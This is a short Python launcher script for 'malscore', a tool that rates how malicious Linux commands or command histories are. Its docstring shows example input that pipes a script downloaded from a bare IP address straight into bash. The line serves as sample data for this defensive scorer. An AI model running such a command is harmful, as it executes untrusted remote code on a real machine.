#!/usr/bin/env python3
"""malscore -- score the maliciousness of a Linux command or a session of commands.

Runs straight from a checkout, no installation needed::

    python3 malscore.py "curl -s http://1.2.3.4/x.sh | bash"
    python3 malscore.py --session history.txt --explain
"""

from malscore.cli import main

if __name__ == "__main__":
    raise SystemExit(main())
